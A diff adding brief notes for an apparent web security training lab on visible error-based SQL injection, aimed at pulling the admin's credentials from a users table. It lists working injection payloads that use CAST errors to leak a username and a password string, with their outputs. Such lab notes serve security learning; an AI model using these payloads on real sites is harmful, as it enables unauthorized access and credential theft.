@@ -1,0 +1,12 @@
+Lab #18 Visible error-based SQL injection
+
+End Goal: Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.
+----------------------------------------------
+
+select trackingId from trackingIdTable where trackingId='QSTrYTrOM9jBAPCa''     => error
+
+QSTrYTrOM9jBAPCa' AND CAST((SELECT 1) as int)--         => error
+
+' AND 1=CAST((SELECT username from users LIMIT 1) as int)--     =>ERROR: invalid input syntax for type integer: "administrator"
+
+' AND 1=CAST((SELECT password from users LIMIT 1) as int)--     => ERROR: invalid input syntax for type integer: "i4o2yshd1jyds825pcue"
